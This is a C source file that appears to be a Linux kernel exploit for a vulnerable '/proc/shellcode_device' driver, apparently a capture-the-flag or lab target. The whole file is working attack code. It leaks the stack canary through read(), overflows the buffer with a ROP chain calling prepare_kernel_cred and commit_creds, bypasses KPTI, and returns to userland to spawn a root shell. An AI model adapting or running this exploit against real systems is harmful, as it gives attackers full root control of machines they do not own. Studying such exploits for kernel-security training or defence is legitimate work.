#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <sys/ioctl.h>

unsigned long user_cs, user_ss, user_rsp, user_rflags;
int fd;
unsigned long prepare_kernel_cred = 0xffffffff810881d0;
unsigned long commit_creds        = 0xffffffff81087e90;
unsigned long pop_rdi_ret         = 0xffffffff81001518; // : pop rdi ; ret
unsigned long pop_rcx_ret         = 0xffffffff81065913; // : pop rcx ; ret 
unsigned long mov_rdi_rax_ret     = 0xffffffff8101c07b; // : mov rdi, rax ; rep movsq qword ptr [rdi], qword ptr [rsi] ; ret
unsigned long swapgs_ret          = 0xffffffff81c00eaa; //: swapgs ; popfq ; ret
unsigned long iretq               = 0xffffffff81023cc2; //:	48 cf    iretq
unsigned long rop_bypass_kpti     = 0xffffffff81c00a45;


void fatal(const char *msg) {
  perror(msg);
  exit(1);
}

static void shell() {
  char *args[] = { "/bin/sh", 0 };
  execve("/bin/sh", args, 0);
  exit(0);
}

unsigned long shell_v = shell;

static void save_state() {
  __asm__("mov %0, cs": "r=" (user_cs) : "r" (user_cs));
  __asm__("mov %0, ss": "r=" (user_ss) : "r" (user_ss));
  __asm__("mov %0, rsp": "r=" (user_rsp) : "r" (user_rsp));
  __asm__("pushfq");
  __asm__("popq %0": "r=" (user_rflags) : "r" (user_rflags));
}

static void restore_state() {
  __asm__("swapgs");
  __asm__("mov [rsp+0x20], %0": "r=" (user_ss) : "r" (user_ss));
  __asm__("mov [rsp+0x18], %0": "r=" (user_rsp) : "r" (user_rsp));
  __asm__("mov [rsp+0x10], %0": "r=" (user_rflags) : "r" (user_rflags));
  __asm__("mov [rsp+0x08], %0": "r=" (user_cs) : "r" (user_cs));
  __asm__("mov [rsp+0x00], %0": "r=" (shell_v) : "r" (shell_v));
  __asm__("iretq");
}

void dump_buffer(void *buf, int len) {
    printf("\nDumping %d bytes.\n\n", len);
    for (int i = 0; i < len; i += 0x10){
        printf("ADDR[%03d, 0x%03x]:\t%016lx: 0x", i / 0x08, i, (unsigned long)(buf + i));
        for (int j = 7; j >= 0; j--) printf("%02x", *(unsigned char *)(buf + i + j));
        printf(" - 0x");
        for (int j = 7; j >= 0; j--) printf("%02x", *(unsigned char *)(buf + i + j + 8));
        puts("");
    }
}

int main() {
  int ret;

  save_state();
  
  fd = open("/proc/shellcode_device", O_RDWR);
  if (fd == -1)
    fatal("/proc/shellcode_device");

  printf("fd = %d\n", fd);

  char buf[0x100];

  // canary leak 
  ret = read(fd, buf, 0x100);
  printf("read = %d\n", ret);
  dump_buffer(buf, 0x100);
  
  unsigned long canary = *(unsigned long *)&buf[0x20];
  printf("[*] canary = 0x%lx\n", canary);

  unsigned long stack = *(unsigned long *)&buf[0xa8];
  printf("[*] stack = 0x%lx\n", stack);
  
  getchar();
  
  /*
  ret = ioctl(fd, 0x7301, 0x10);  
  printf("ioctl = %d\n", ret);
  */
  
  memset(buf, 0x41, 0x100);
  
  unsigned long *chain = (unsigned long *)&buf[0x20];
  *chain++ = canary;
  *chain++ = 0;
  *chain++ = pop_rdi_ret;
  *chain++ = 0;
  *chain++ = prepare_kernel_cred;
  *chain++ = pop_rcx_ret;
  *chain++ = 0;
  *chain++ = mov_rdi_rax_ret;
  *chain++ = commit_creds;
  *chain++ = rop_bypass_kpti;
  *chain++ = 0;
  *chain++ = 0;
  *chain++ = shell;
  *chain++ = user_cs;
  *chain++ = user_rflags;
  *chain++ = user_rsp;
  *chain++ = user_ss;

  ret = write(fd, buf, 0x100);
  printf("write = %d\n", ret);
  
  //getchar();
}   

